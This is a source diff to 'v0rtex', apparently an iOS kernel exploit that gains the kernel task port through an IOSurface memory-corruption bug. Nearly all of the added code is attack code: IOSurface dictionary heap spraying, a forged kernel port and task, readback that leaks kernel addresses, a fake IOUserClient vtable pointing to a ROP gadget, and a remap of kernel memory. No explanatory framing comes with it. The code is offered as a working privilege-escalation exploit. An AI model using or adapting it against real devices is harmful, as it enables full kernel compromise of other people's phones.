@@ -19,6 +19,31 @@
 #include <mach/mach.h>
 #include <CoreFoundation/CoreFoundation.h>
 
+// Stuff I did
+#define FILL_MEMSIZE 0x4000000
+#define UINT64_ALIGN_DOWN(addr) ((addr) & ~7)
+#define UINT64_ALIGN_UP(addr) UINT64_ALIGN_DOWN((addr) + 7)
+#define VOLATILE_BCOPY32(src, dst, size) \
+    do \
+    { \
+    for(volatile uint32_t *_src = (volatile uint32_t*)(src), \
+                          *_dst = (volatile uint32_t*)(dst), \
+                          *_end = (volatile uint32_t*)((uintptr_t)(_src) + (size)); \
+        _src < _end; \
+        *(_dst++) = *(_src++) \
+    ); \
+} while(0)
+
+#define VOLATILE_BZERO32(addr, size) \
+do \
+{ \
+        for(volatile uint32_t *_ptr = (volatile uint32_t*)(addr), \
+                                       *_end = (volatile uint32_t*)((uintptr_t)(_ptr) + (size)); \
+                     _ptr < _end; \
+                     *(_ptr++) = 0 \
+             ); \
+} while(0)
+
 #include "common.h"
 #include "offsets.m"
 
@@ -36,7 +61,7 @@
 #define OFFSET_IOUSERCLIENT_IPC                     0x9c
 #define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX     0x5b8
 
-#define KPTR_ALIGN(addr) (((addr) + sizeof(kptr_t) - 1) & ~(sizeof(kptr_t) - 1))
+// #define KPTR_ALIGN(addr) (((addr) + sizeof(kptr_t) - 1) & ~(sizeof(kptr_t) - 1))
 
 const uint64_t IOSURFACE_CREATE_SURFACE =  0;
 const uint64_t IOSURFACE_SET_VALUE      =  9;
@@ -347,7 +372,7 @@ static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uin
 }
 
 #ifdef __LP64__
-typedef struct
+typedef volatile struct
 {
     kptr_t prev;
     kptr_t next;
@@ -356,7 +381,7 @@ typedef struct
 } kmap_hdr_t;
 #endif
 
-typedef struct {
+typedef volatile struct {
     uint32_t ip_bits;
     uint32_t ip_references;
     struct {
@@ -398,7 +423,7 @@ typedef struct {
     natural_t ip_sorights;
 } kport_t;
 
-typedef struct {
+typedef volatile struct {
     union {
         kptr_t port;
         natural_t index;
@@ -409,7 +434,7 @@ typedef struct {
     } name;
 } kport_request_t;
 
-typedef union
+typedef volatile union
 {
     struct {
         struct {
@@ -430,6 +455,69 @@ typedef union
     } b;
 } ktask_t;
 
+// ********** ********** ********** more helper functions because it turns out we need access to data structures... sigh ********** ********** **********
+
+static kern_return_t reallocate_fakeport(io_connect_t client, uint32_t surfaceId, uint32_t pageId, uint64_t off, mach_vm_size_t pagesize, kport_t *kport, uint32_t *buf, mach_vm_size_t len)
+{
+    bool twice = false;
+    if(off + sizeof(kport_t) > pagesize)
+    {
+        twice = true;
+        VOLATILE_BCOPY32(kport, (void*)((uintptr_t)&buf[9] + off), pagesize - off);
+        VOLATILE_BCOPY32((void*)((uintptr_t)kport + (pagesize - off)), &buf[9], sizeof(kport_t) - off);
+    }
+    else
+    {
+        VOLATILE_BCOPY32(kport, (void*)((uintptr_t)&buf[9] + off), sizeof(kport_t));
+    }
+    buf[6] = transpose(pageId);
+    kern_return_t ret = reallocate_buf(client, surfaceId, pageId, buf, len);
+    if(twice && ret == KERN_SUCCESS)
+    {
+        ++pageId;
+        buf[6] = transpose(pageId);
+        ret = reallocate_buf(client, surfaceId, pageId, buf, len);
+    }
+    return ret;
+}
+
+kern_return_t readback_fakeport(io_connect_t client, uint32_t pageId, uint64_t off, mach_vm_size_t pagesize, uint32_t *request, size_t reqsize, uint32_t *resp, size_t respsz, kport_t *kport)
+{
+    request[2] = transpose(pageId);
+    size_t size = respsz;
+    kern_return_t ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, reqsize, resp, &size);
+    LOG("getValue(%u): 0x%lx bytes, %s", pageId, size, mach_error_string(ret));
+    if(ret == KERN_SUCCESS && size == respsz)
+    {
+        size_t sz = pagesize - off;
+        if(sz > sizeof(kport_t))
+        {
+            sz = sizeof(kport_t);
+        }
+        VOLATILE_BCOPY32((void*)((uintptr_t)&resp[4] + off), kport, sz);
+        if(sz < sizeof(kport_t))
+        {
+            ++pageId;
+            request[2] = transpose(pageId);
+            size = respsz;
+            ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, reqsize, resp, &size);
+            LOG("getValue(%u): 0x%lx bytes, %s", pageId, size, mach_error_string(ret));
+            if(ret == KERN_SUCCESS && size == respsz)
+            {
+                VOLATILE_BCOPY32(&resp[4], (void*)((uintptr_t)kport + sz), sizeof(kport_t) - sz);
+            }
+        }
+    }
+    if(ret == KERN_SUCCESS && size < respsz)
+    {
+        LOG("Response too short.");
+        ret = KERN_FAILURE;
+    }
+    return ret;
+}
+
+// ********** ********** ********** ye olde pwnage ********** ********** **********
+
 kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
 {
     load_offsets();
@@ -438,6 +526,25 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     task_t self = mach_task_self();
     host_t host = mach_host_self();
     
+    //Stuff I did
+    mach_vm_size_t pagesize = 0,
+                       shmemsz = 0;
+        uint32_t *dict_prep = NULL,
+                 *dict_big = NULL,
+                 *dict_small = NULL,
+                 *resp = NULL;
+    
+    /********** ********** data hunting ********** **********/
+    
+    vm_size_t pgsz = 0;
+    ret = _host_page_size(host, &pgsz);
+    pagesize = pgsz;
+    LOG("page size: 0x%llx, %s", pagesize, mach_error_string(ret));
+    if(ret != KERN_SUCCESS)
+    {
+        goto out0;
+    }
+
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     LOG("service: %x", service);
     if(!MACH_PORT_VALID(service))
@@ -479,6 +586,10 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
             uint32_t id;
         } data;
     } surface;
+    
+    //Stuff I did
+    VOLATILE_BZERO32(&surface, sizeof(surface));
+    
     size_t size = sizeof(surface);
     ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
     LOG("newSurface: %s", mach_error_string(ret));
@@ -486,6 +597,113 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     {
         goto out1;
     }
+    
+    //Stuff I did
+    LOG("surface ID: 0x%x", surface.data.id);
+    
+    /********** ********** data preparation ********** **********/
+    
+    size_t num_data = FILL_MEMSIZE / pagesize,
+    dictsz_prep  = (5 + 4 * num_data) * sizeof(uint32_t),
+    dictsz_big   = dictsz_prep + (num_data * pagesize),
+    dictsz_small = 9 * sizeof(uint32_t) + pagesize,
+    respsz = 4 * sizeof(uint32_t) + pagesize;
+    dict_prep = malloc(dictsz_prep);
+    if(!dict_prep)
+    {
+        LOG("malloc(prep): %s", strerror(errno));
+        goto out1;
+    }
+    dict_big = malloc(dictsz_big);
+    if(!dict_big)
+    {
+        LOG("malloc(big): %s", strerror(errno));
+        goto out1;
+    }
+    dict_small = malloc(dictsz_small);
+    if(!dict_small)
+    {
+        LOG("malloc(small): %s", strerror(errno));
+        goto out1;
+    }
+    resp = malloc(respsz);
+    if(!resp)
+    {
+        LOG("malloc(resp): %s", strerror(errno));
+        goto out1;
+    }
+    VOLATILE_BZERO32(dict_prep,  dictsz_prep);
+    VOLATILE_BZERO32(dict_big,   dictsz_big);
+    VOLATILE_BZERO32(dict_small, dictsz_small);
+    VOLATILE_BZERO32(resp,       respsz);
+    
+    // ipc.ports zone uses 0x3000 allocation chunks, but hardware page size before A9
+    // is actually 0x1000, so references to our reallocated memory may be shifted
+    // by (0x1000 % sizeof(kport_t))
+    kport_t triple_kport;
+    VOLATILE_BZERO32(&triple_kport, sizeof(triple_kport));
+    triple_kport.ip_lock.data = 0x0;
+    triple_kport.ip_lock.type = 0x11;
+#ifdef __LP64__
+    triple_kport.ip_messages.port.waitq.waitq_queue.next = 0x0;
+    triple_kport.ip_messages.port.waitq.waitq_queue.prev = 0x11;
+    triple_kport.ip_nsrequest = 0x0;
+    triple_kport.ip_pdrequest = 0x11;
+#endif
+    
+    uint32_t *prep = dict_prep;
+    uint32_t *big = dict_big;
+    *(big++) = *(prep++) = surface.data.id;
+    *(big++) = *(prep++) = 0x0;
+    *(big++) = *(prep++) = kOSSerializeMagic;
+    *(big++) = *(prep++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
+    *(big++) = *(prep++) = kOSSerializeEndCollection | kOSSerializeDictionary | num_data;
+    for(size_t i = 0; i < num_data; ++i)
+    {
+        *(big++) = *(prep++) = kOSSerializeSymbol | 5;
+        *(big++) = *(prep++) = transpose(i);
+        *(big++) = *(prep++) = 0x0; // null terminator
+        *(big++) = (i + 1 >= num_data ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1);
+        size_t j = 0;
+        for(uintptr_t ptr = (uintptr_t)big, end = ptr + pagesize; ptr < end; ptr += sizeof(triple_kport))
+        {
+            size_t sz = end - ptr;
+            if(sz > sizeof(triple_kport))
+            {
+                sz = sizeof(triple_kport);
+            }
+            triple_kport.ip_context = (0x10000000ULL | (j << 20) | i) << 32;
+#ifdef __LP64__
+            triple_kport.ip_messages.port.pad = 0x20000000 | (j << 20) | i;
+            triple_kport.ip_lock.pad = 0x30000000 | (j << 20) | i;
+#endif
+            VOLATILE_BCOPY32(&triple_kport, ptr, sz);
+            ++j;
+        }
+        big += (pagesize / sizeof(uint32_t));
+        *(prep++) = (i + 1 >= num_data ? kOSSerializeEndCollection : 0) | kOSSerializeBoolean | 1;
+    }
+    
+    dict_small[0] = surface.data.id;
+    dict_small[1] = 0x0;
+    dict_small[2] = kOSSerializeMagic;
+    dict_small[3] = kOSSerializeEndCollection | kOSSerializeArray | 1;
+    dict_small[4] = kOSSerializeEndCollection | kOSSerializeDictionary | 1;
+    dict_small[5] = kOSSerializeSymbol | 5;
+    // [6] later
+    dict_small[7] = 0x0; // null terminator
+    dict_small[8] = kOSSerializeEndCollection | kOSSerializeString | (pagesize - 1);
+    
+    uint32_t dummy = 0;
+    size = sizeof(dummy);
+    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict_prep, dictsz_prep, &dummy, &size);
+    if(ret != KERN_SUCCESS)
+    {
+        LOG("setValue(prep): %s", mach_error_string(ret));
+        goto out1;
+    }
+    
+    /********** ********** black magic ********** **********/
     
     mach_port_t realport = MACH_PORT_NULL;
     ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);
@@ -571,16 +789,16 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     
     sched_yield();
     ret = mach_ports_register(self, &client, 1); // gonna use that later
-    LOG("mach_ports_register: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
+        LOG("mach_ports_register: %s", mach_error_string(ret));
         goto out3;
     }
     
     // Prevent cleanup
     mach_port_t fakeport = port;
     port = MACH_PORT_NULL;
-    
+#if 0
 #define DATA_SIZE 0x1000
     uint32_t dict[DATA_SIZE / sizeof(uint32_t) + 7] =
     {
@@ -626,7 +844,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     {
         *(volatile kport_t*)ptr = triple_kport;
     }
-    
+#endif
     sched_yield();
     for(size_t i = NUM_AFTER; i > 0; --i)
     {
@@ -651,7 +869,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         LOG("mach_zone_force_gc: %s", mach_error_string(ret));
         goto out3;
     }
-    
+#if 0
     for(uint32_t i = 0; i < 0x2000; ++i)
     {
         dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(i);
@@ -671,6 +889,15 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
             goto out3;
         }
     }
+#endif
+    dummy = 0;
+        size = sizeof(dummy);
+        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict_big, dictsz_big, &dummy, &size);
+        if(ret != KERN_SUCCESS)
+            {
+                    LOG("setValue(big): %s", mach_error_string(ret));
+                    goto out3;
+                }
     
     uint64_t ctx = 0xffffffff;
     ret = my_mach_port_get_context(self, fakeport, &ctx);
@@ -686,50 +913,62 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         LOG("Invalid shift mask.");
         goto out3;
     }
+#if 0
     uint32_t shift_off = sizeof(kport_t) - (((shift_mask - 1) * 0x1000) % sizeof(kport_t));
-    
-    uint32_t idx = (ctx >> 32) & 0xfffffff;
+#endif
+    uint32_t ins = ((shift_mask - 1) * pagesize) % sizeof(kport_t),
+    idx = (ctx >> 32) & 0xfffff,
+    iff = (ctx >> 52) & 0xff;
+    int64_t fp_off = sizeof(kport_t) * iff - ins;
+    if(fp_off < 0)
+    {
+        --idx;
+        fp_off += pagesize;
+    }
+    uint64_t fakeport_off = (uint64_t)fp_off;
+    LOG("fakeport offset: 0x%llx", fakeport_off);
+#if 0
     dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(idx);
+#endif
     uint32_t request[] =
     {
         // Same header
         surface.data.id,
         0x0,
         
+        
+#if 0
         transpose(idx), // Key
+#endif
+        0x0, // Placeholder
         0x0, // Null terminator
     };
-    kport_t kport =
-    {
-        .ip_bits = 0x80000000, // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
-        .ip_references = 100,
-        .ip_lock =
-        {
-            .type = 0x11,
-        },
-        .ip_messages =
-        {
-            .port =
-            {
-                .receiver_name = 1,
-                .msgcount = MACH_PORT_QLIMIT_KERNEL,
-                .qlimit = MACH_PORT_QLIMIT_KERNEL,
-            },
-        },
-        .ip_srights = 99,
-    };
+
+    kport_t kport;
+    VOLATILE_BZERO32(&kport, sizeof(kport));
+    kport.ip_bits = 0x80000000; // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
+    kport.ip_references = 100;
+    kport.ip_lock.type = 0x11;
+    kport.ip_messages.port.receiver_name = 1;
+    kport.ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
+    kport.ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
+    kport.ip_srights = 99;
     
+#if 0
     for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
     {
         *(volatile kport_t*)ptr = kport;
     }
+#endif
     
-    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
-    LOG("reallocate_buf: %s", mach_error_string(ret));
+    ret = reallocate_fakeport(client, surface.data.id, idx, fakeport_off, pagesize, &kport, dict_small, dictsz_small);
+        LOG("reallocate_fakeport: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
         goto out3;
     }
+    
+    usleep(100000); // XXX
     
     // Register realport on fakeport
     mach_port_t notify = MACH_PORT_NULL;
@@ -740,6 +979,9 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         goto out3;
     }
     
+    usleep(100000); // XXX
+    
+#if 0
     uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
     size = sizeof(response);
     ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
@@ -753,7 +995,15 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         LOG("Response too short.");
         goto out3;
     }
-    
+#endif
+    kport_t myport;
+    VOLATILE_BZERO32(&myport, sizeof(myport));
+    ret = readback_fakeport(client, idx, fakeport_off, pagesize, request, sizeof(request), resp, respsz, &myport);
+    if(ret != KERN_SUCCESS)
+    {
+        goto out3;
+    }
+#if 0
     uint32_t fakeport_off = -1;
     kptr_t realport_addr = 0;
     for(uintptr_t ptr = (uintptr_t)&response[4] + shift_off, end = (uintptr_t)&response[4] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
@@ -766,14 +1016,17 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
             break;
         }
     }
+#endif
+    kptr_t realport_addr = myport.ip_pdrequest;
     if(!realport_addr)
     {
         LOG("Failed to leak realport address");
         goto out3;
     }
     LOG("realport addr: " ADDR, realport_addr);
+#if 0
     volatile kport_t *fakeport_buf = (volatile kport_t*)((uintptr_t)&dict[5] + fakeport_off);
-    
+#endif
     // Register fakeport on itself (and clean ref on realport)
     notify = MACH_PORT_NULL;
     ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, fakeport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
@@ -783,6 +1036,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         goto out3;
     }
     
+#if 0
     size = sizeof(response);
     ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
     LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
@@ -796,6 +1050,13 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         goto out3;
     }
     kptr_t fakeport_addr = ((volatile kport_t*)((uintptr_t)&response[4] + fakeport_off))->ip_pdrequest;
+#endif
+        ret = readback_fakeport(client, idx, fakeport_off, pagesize, request, sizeof(request), resp, respsz, &myport);
+        if(ret != KERN_SUCCESS)
+            {
+                    goto out3;
+                }
+        kptr_t fakeport_addr = myport.ip_pdrequest;
     if(!realport_addr)
     {
         LOG("Failed to leak fakeport address");
@@ -804,17 +1065,28 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("fakeport addr: " ADDR, fakeport_addr);
     kptr_t fake_addr = fakeport_addr - fakeport_off;
     
-    kport_request_t kreq;
+    kport_request_t kreq =
+    {
+        .notify =
+        {
+            .port = 0,
+        }
+    };
     kport.ip_requests = fakeport_addr + ((uintptr_t)&kport.ip_context - (uintptr_t)&kport) - ((uintptr_t)&kreq.name.size - (uintptr_t)&kreq);
-    *fakeport_buf = kport;
-    
+#if 0
     ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
     LOG("reallocate_buf: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
         goto out3;
     }
-    
+#endif
+    ret = reallocate_fakeport(client, surface.data.id, idx, fakeport_off, pagesize, &kport, dict_small, dictsz_small);
+    LOG("reallocate_fakeport: %s", mach_error_string(ret));
+    if(ret != KERN_SUCCESS)
+    {
+        goto out3;
+    }
 #define KREAD(addr, buf, len) \
 do \
 { \
@@ -903,47 +1175,80 @@ goto out3; \
     KREAD(IOSurfaceRootUserClient_vtab, vtab, sizeof(vtab));
     vtab[OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX / sizeof(kptr_t)] = OFF(ROP_ADD_X0_X0_0x10);
     
-    uint32_t faketask_off = fakeport_off < sizeof(ktask_t) ? fakeport_off + sizeof(kport_t) : 0;
-    faketask_off = KPTR_ALIGN(faketask_off);
-    volatile ktask_t *faketask_buf = (volatile ktask_t*)((uintptr_t)&dict[5] + faketask_off);
+    uint32_t faketask_off = fakeport_off < sizeof(ktask_t) ? UINT64_ALIGN_UP(fakeport_off + sizeof(kport_t)) : UINT64_ALIGN_DOWN(fakeport_off - sizeof(ktask_t));
+    void* faketask_buf = (void*)((uintptr_t)&dict_small[9] + faketask_off);
     
     ktask_t ktask;
+    VOLATILE_BZERO32(&ktask, sizeof(ktask));
     ktask.a.lock.data = 0x0;
     ktask.a.lock.type = 0x22;
     ktask.a.ref_count = 100;
     ktask.a.active = 1;
     ktask.a.map = zone_map_addr;
     ktask.b.itk_self = 1;
-    *faketask_buf = ktask;
+    
+    VOLATILE_BCOPY32(&ktask, faketask_buf, sizeof(ktask));
     
     kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
     kport.ip_kobject = fake_addr + faketask_off;
-    
     kport.ip_requests = 0;
-    *fakeport_buf = kport;
+    kport.ip_context = 0;
+    
+    if(fakeport_off + sizeof(kport_t) > pagesize)
+    {
+        size_t sz = pagesize - fakeport_off;
+        VOLATILE_BCOPY32(&kport, (void*)((uintptr_t)&dict_small[9] + fakeport_off), sz);
+        VOLATILE_BCOPY32((void*)((uintptr_t)&kport + sz), &dict_small[9], sizeof(kport) - sz);
+    }
+    else
+    {
+        VOLATILE_BCOPY32(&kport, (void*)((uintptr_t)&dict_small[9] + fakeport_off), sizeof(kport));
+    }
     
 #undef KREAD
+#if 0
     ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
     LOG("reallocate_buf: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
         goto out3;
     }
+#endif
+    shmemsz = pagesize;
+    dict_small[6] = transpose(idx);
+    ret = reallocate_buf(client, surface.data.id, idx, dict_small, dictsz_small);
+    LOG("reallocate_buf: %s", mach_error_string(ret));
+    if(ret != KERN_SUCCESS)
+    {
+        goto out3;
+    }
+    if(fakeport_off + sizeof(kport_t) > pagesize)
+    {
+        shmemsz *= 2;
+        dict_small[6] = transpose(idx + 1);
+        ret = reallocate_buf(client, surface.data.id, idx + 1, dict_small, dictsz_small);
+        LOG("reallocate_buf: %s", mach_error_string(ret));
+        if(ret != KERN_SUCCESS)
+        {
+            goto out3;
+        }
+    }
     
     mach_vm_address_t shmem_addr = 0;
     vm_prot_t cur = 0,
     max = 0;
-    ret = mach_vm_remap(self, &shmem_addr, DATA_SIZE, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, fakeport, fake_addr, false, &cur, &max, VM_INHERIT_NONE);
+    ret = mach_vm_remap(self, &shmem_addr, shmemsz, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, fakeport, fake_addr, false, &cur, &max, VM_INHERIT_NONE);
     LOG("mach_vm_remap: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
         goto out3;
     }
+    *(uint32_t*)shmem_addr = 123; // fault page
     LOG("shmem_addr: 0x%016llx", shmem_addr);
-    fakeport_buf = (volatile kport_t*)(shmem_addr + fakeport_off);
+    volatile kport_t *fakeport_buf = (volatile kport_t*)(shmem_addr + fakeport_off);
     
     uint32_t vtab_off = fakeport_off < sizeof(vtab) ? fakeport_off + sizeof(kport_t) : 0;
-    vtab_off = KPTR_ALIGN(vtab_off);
+    vtab_off = UINT64_ALIGN_UP(vtab_off);
     kptr_t vtab_addr = fake_addr + vtab_off;
     LOG("vtab addr: " ADDR, vtab_addr);
     volatile kptr_t *vtab_buf = (volatile kptr_t*)(shmem_addr + vtab_off);
@@ -967,7 +1272,7 @@ if(numranges >= MAXRANGES) \
 LOG("FIND_RANGE(" #var "): ranges array too small"); \
 goto out3; \
 } \
-for(int32_t i = 0; i < numranges; ++i) \
+for(uint32_t i = 0; i < numranges;) \
 { \
 uint32_t end = var + (uint32_t)(size); \
 if( \
@@ -975,11 +1280,13 @@ if( \
 (end >= ranges[i].start && var < ranges[i].end) \
 ) \
 { \
-var = KPTR_ALIGN(ranges[i].end); \
-i = -1; \
+var = UINT64_ALIGN_UP(ranges[i].end); \
+    i = 0; \
+    continue; \
 } \
+++i; \
 } \
-if(var + (uint32_t)(size) > DATA_SIZE) \
+if(var + (uint32_t)(size) > pagesize) \
 { \
 LOG("FIND_RANGE(" #var ") out of range: 0x%x-0x%x", var, var + (uint32_t)(size)); \
 goto out3; \
@@ -989,7 +1296,7 @@ ranges[numranges].end = var + (uint32_t)(size); \
 ++numranges; \
 } while(0)
     
-    typedef union
+    typedef volatile union
     {
         struct {
             // IOUserClient fields
@@ -1012,7 +1319,8 @@ ranges[numranges].end = var + (uint32_t)(size); \
     kptr_t fakeobj_addr = fake_addr + fakeobj_off;
     LOG("fakeobj addr: " ADDR, fakeobj_addr);
     volatile kobj_t *fakeobj_buf = (volatile kobj_t*)(shmem_addr + fakeobj_off);
-    for(volatile char *ptr = (volatile char*)fakeobj_buf, *end = ptr + sizeof(*fakeobj_buf); ptr < end; *(ptr++) = 0);
+    VOLATILE_BZERO32(fakeobj_buf, sizeof(kobj_t));
+    // for(volatile char *ptr = (volatile char*)fakeobj_buf, *end = ptr + sizeof(*fakeobj_buf); ptr < end; *(ptr++) = 0);
     
     fakeobj_buf->a.vtab = vtab_addr;
     fakeobj_buf->a.refs = 100;
@@ -1082,7 +1390,8 @@ fakeobj_buf->a.func = (kptr_t)(addr), \
     kptr_t zm_task_addr = fake_addr + zm_task_off;
     LOG("zm_task addr: " ADDR, zm_task_addr);
     volatile ktask_t *zm_task_buf = (volatile ktask_t*)(shmem_addr + zm_task_off);
-    for(volatile char *ptr = (volatile char*)zm_task_buf, *end = ptr + sizeof(*zm_task_buf); ptr < end; *(ptr++) = 0);
+    VOLATILE_BZERO32(zm_task_buf, sizeof(ktask_t));
+    // for(volatile char *ptr = (volatile char*)zm_task_buf, *end = ptr + sizeof(*zm_task_buf); ptr < end; *(ptr++) = 0);
     
     zm_task_buf->a.lock.data = 0x0;
     zm_task_buf->a.lock.type = 0x22;
@@ -1096,7 +1405,8 @@ fakeobj_buf->a.func = (kptr_t)(addr), \
     kptr_t km_task_addr = fake_addr + km_task_off;
     LOG("km_task addr: " ADDR, km_task_addr);
     volatile ktask_t *km_task_buf = (volatile ktask_t*)(shmem_addr + km_task_off);
-    for(volatile char *ptr = (volatile char*)km_task_buf, *end = ptr + sizeof(*km_task_buf); ptr < end; *(ptr++) = 0);
+    VOLATILE_BZERO32(km_task_buf, sizeof(ktask_t));
+    // for(volatile char *ptr = (volatile char*)km_task_buf, *end = ptr + sizeof(*km_task_buf); ptr < end; *(ptr++) = 0);
     
     km_task_buf->a.lock.data = 0x0;
     km_task_buf->a.lock.type = 0x22;
